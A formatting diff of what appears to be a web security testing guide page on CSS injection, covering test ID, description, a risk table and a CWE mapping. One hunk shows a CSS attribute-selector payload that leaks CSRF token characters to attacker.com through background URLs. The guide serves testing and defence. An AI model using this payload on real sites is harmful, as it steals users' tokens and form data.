@@ -1,9 +1,11 @@
 # WSTG-CLNT-05: Testing for CSS Injection
 
 ## Test ID
+
 WSTG-CLNT-05
 
 ## Test Name
+
 Testing for CSS Injection
 
 ## High-Level Description
@@ -50,10 +52,10 @@ done
 /* Can extract CSRF tokens, input values */
 
 input[name="csrf"][value^="a"] {
-    background: url(https://attacker.com/log?csrf=a);
+  background: url(https://attacker.com/log?csrf=a);
 }
 input[name="csrf"][value^="b"] {
-    background: url(https://attacker.com/log?csrf=b);
+  background: url(https://attacker.com/log?csrf=b);
 }
 /* ... repeat for each character */
 ```
@@ -121,17 +123,17 @@ def sanitize_css(property_name, value):
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| CSS data exfiltration | 4.3 | Medium |
-| UI redressing via CSS | 3.5 | Low |
+| Finding               | CVSS | Severity |
+| --------------------- | ---- | -------- |
+| CSS data exfiltration | 4.3  | Medium   |
+| UI redressing via CSS | 3.5  | Low      |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
+| CWE ID     | Title                                                 |
+| ---------- | ----------------------------------------------------- |
 | **CWE-74** | Improper Neutralization of Special Elements in Output |
 
 ---
